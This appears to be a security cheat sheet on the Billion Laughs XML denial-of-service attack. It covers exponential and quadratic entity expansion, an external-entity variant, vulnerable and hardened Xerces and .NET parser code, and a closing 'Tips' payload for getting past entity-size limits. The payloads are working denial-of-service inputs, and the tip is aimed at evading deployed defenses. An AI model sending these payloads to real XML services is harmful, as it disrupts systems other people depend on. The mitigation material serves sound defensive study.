# XXE Bomb a.k.a Billion laugh attack

## The Billion Laughs Attack
The Billion Laughs attack is a denial-of-service attack that targets XML parsers.  The Billion Laughs attack is also known as an XML bomb, or more esoterically, the exponential entity expansion attack.  A Billion Laughs attack can occur even when using well-formed XML and can also pass XML schema validation.  For this reason, it may sometimes be tricky to figure out how to mitigate the threat of the Billion Laughs attack when working with different XML parsers.

### Background
In order to understand how to mitigate the Billion Laughs attack, it is important to understand the processes to lead the denial-of-service that this attack causes.  I will assume that you have a basic knowledge of XML, and if you don’t it isn’t hard to understand.  A quick search engine query or a quick look at Wikipedia, should provide you with all you need.  The topic that is important to understand the Billion Laughs attack is the XML entity.

An XML entity is a symbolic representation of information, just like a variable in a computer program.  In XML, entities must be declared in the Document Type Definition (DTD), just like an element or an attribute.  There are multiple types of entities; entities are either parsed or unparsed, general entities or parameter entities, and internal or external entities.  In this explanation we will deal primarily with general entities, of both the internal and external type.

To define an XML entity in the DTD, simply use the XML entity syntax:

```
<!ENTITY entityName "Text Value">
```

Then to use the entity in the XML document content section, you use an ampersand (&) followed by the entityName you specified in the DTD followed by a semicolon (;).  This may seem familiar to you as there are five pre-defined XML entities lt, gt, amp, apos, and quot.  To use these entities in XML or HTML you would type &lt;, &gt;, &amp;, &apos;, and &quot; respectively.

To use the XML entity created above, you would add the following to the document content section:

&entityName;

When a DOM or SAX implementing XML parser encounters XML entities while parsing, it tries to expand them.  How this is done depends on whether or not the entity is a parsed or unparsed entity, but the concept is the same.  The parser will replace the entity in the document content with the entity definition and continue parsing.  If the entity definition contains references to other entities, these will also have to be expanded.  That is the key to the Billion Laughs attack.

### Exploit
The vanilla Billion Laughs attack is illustrated in the XML file represented below.

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

In this example, there are 10 different XML entities, lol – lol9. The first entity, lol is defined to be the string “lol”.  However, each of the other entities are defined to be 10 of another entity.  The document content section of this XML file contains a reference to only one instance of the entity lol9.  However, when this is being parsed by a DOM or SAX parser, when lol9 is encountered, it is expanded into 10 lol8’s, each of which is expanded into 10 lol7’s, and so on and so forth.  By the time everything is expanded to the text lol, there are 100,000,000 instances of the string lol.  If there was one more entity, or lol was defined as 10 strings of “lol”, there would be a Billion “lol”s, hence the name of the attack.  Needless to say, this many expansions consumes an exponential amount of resources and time, causing the DOS.

### Attack Variations
The above attack is known esoterically as the Exponential Entity Expansion XML Bomb.  A variation on it is known as the Quadratic Blowup attack.  In this attack, instead of defining multiple layers of entity expansion, the attacker just defines one very large entity and refers to it many times.

```
<?xml version="1.0"?><!DOCTYPE payload [
<!ENTITY A "AAAAAAAAAAAAAAAAAAA...">
]>
<payload>&A;&A;&A;&A;&A;&A;...</payload>
```

In this example, imagine that the entity A contains tens to hundreds of thousands of ‘A’s and that payload contains tens or hundreds of thousands references to A.  This can consume a large amount of resources with fewer expansions than the Exponential Entity Expansion Attack.

So far, all of the attacks mentioned have utilized internal entities.  An interesting variation on this attack uses external entities.  External entities can be defined as follows

```
<!ENTITY stockprice SYSTEM "http://www.website.com/dos_util">
```


In this example the implementation of dos_util can vary.  The first type of attack would be a resource that never returns, stalling the parser infinitely.  This would DOS one thread of execution, but wouldn’t consume many resources.  Another example could be a dos_util that wrote an infinite amount of data when accessed.  A less obvious example would simple be a very large, legitimate looking file.

### Mitigating the Threat of a Billion Laughs
Because the behavior of each XML parser may be different based on implementation, there is no one way to prevent Billion Laughs attacks.  However, there are a few main techniques used to prevent this denial-of-service attack.

1. Turn off entity expansion.
2. Limit the number of Entity Reference Nodes that the parser can expand.
3. Limit the number of characters entities can expand to.

All, some, or none of these options may be available to you depending on what XML parsing API you are using.  Each method also has its pros and cons.  For example, you might require entity expansion in your code, so in that case, obviously turning off entity expansion is not a good choice.  Methods for mitigating the Billion Laughs threat in some common XML parsers are described below.

#### Xerces
Vulnerable Code:
```
#include <xercesc/parsers/XercesDOMParser.hpp>
#include <xercesc/dom/DOM.hpp>
#include <xercesc/sax/HandlerBase.hpp>
#include <xercesc/util/XMLString.hpp>
#include <xercesc/util/PlatformUtils.hpp>
#include <iostream>

using namespace std;
XERCES_CPP_NAMESPACE_USE

int main (int argc, char* argv[]) {

try {
XMLPlatformUtils::Initialize();
}
catch (const XMLException& toCatch) {
return EXIT_FAILURE;
}

XercesDOMParser parser;
parser.setValidationScheme(XercesDOMParser::Val_Always);
parser.setDoNamespaces(true);
parser.setDoSchema(true);

HandlerBase errHandler;
parser.setErrorHandler(&errHandler);

if (argc != 2) {
cerr << "Usage: lol_vuln lol.xml" << endl;
return EXIT_FAILURE;
}

const char* xmlFile = argv[1];
try {
parser.parse(xmlFile);
}  catch (...) {
return EXIT_FAILURE;
}
return 0;
}
```

Fixed Code:
```
#include <xercesc/parsers/XercesDOMParser.hpp>
#include <xercesc/dom/DOM.hpp>
#include <xercesc/sax/HandlerBase.hpp>
#include <xercesc/util/XMLString.hpp>
#include <xercesc/util/PlatformUtils.hpp>

// Include the security manager
#include <xercesc/util/SecurityManager.hpp>

#include <iostream>

using namespace std;
XERCES_CPP_NAMESPACE_USE

int main (int argc, char* argv[]) {
try {
XMLPlatformUtils::Initialize();
} catch (const XMLException& toCatch) {
return EXIT_FAILURE;
}

XercesDOMParser parser;
parser.setValidationScheme(XercesDOMParser::Val_Always);
parser.setDoNamespaces(true);
parser.setDoSchema(true);

SecurityManager sm;
sm.setEntityExpansionLimit(100);
parser.setSecurityManager(&sm);
HandlerBase errHandler;
parser.setErrorHandler(&errHandler);

if (argc != 2) {
cerr << "Usage: lol_no_vuln lol.xml" << endl;
return EXIT_FAILURE;
}

const char* xmlFile = argv[1];
try {
parser.parse(xmlFile);
} catch (...) {
}
return 0;
}
```

##### Explanation

In Xerces, the way to mitigate the Billion Laughs attack is to create a SecurityManager and set an Entity Expansion Limit, which is the number of entities an entity can expand to.  If the number of entity expansions bypasses this limit, Xerces throws a SAXParserException.  This easily prevents the Exponential Entity Expansion Attack, and if set low enough, will prevent crippling Quadratic Blowup attacks, although this is not as effective at preventing Quadratic Blowup Attacks as it is Exponential Entity Expansion Attacks.  The Entity Expansion Limit does not protect against external entity attacks.

#### .NET
```
XmlReaderSettings settings = new XmlReaderSettings();
settings.ProhibitDtd = false;
settings.MaxCharactersFromEntities = 1024;
XmlReader reader = XmlReader.Create(stream, settings);
```

#### Explanation
Limit server to expand to a maximum of 1Mb in size of entity.


### Tips
By pass entity size by sending _null_ entity. It will not restrict by entity size, but DoS on XML process all the blob. In conclusion it quite less impact than the original one, but still visible result.
```
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY LOL “”>
<!ENTITY LOL1 “&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;”>
<!ENTITY LOL2 “&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;”>
<!ENTITY LOL3 “&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;”>
<!ENTITY LOL4 “&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;”>
<!ENTITY LOL5 “&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;”>
<!ENTITY LOL6 “&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;”>
<!ENTITY LOL7 “&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;”>
<!ENTITY LOL8 “&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;”>
<!ENTITY LOL9 “&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;”>
]>
<root>&LOL9;</root>
```


## Reference
- [XXE Bomb explain](https://cytinus.wordpress.com/2011/07/26/37/)
- [Null attack](https://medium.com/tsscyber/the-billion-silent-laughs-attack-that-time-incapsula-was-vulnerable-to-a-dos-attack-e8b546c10981)
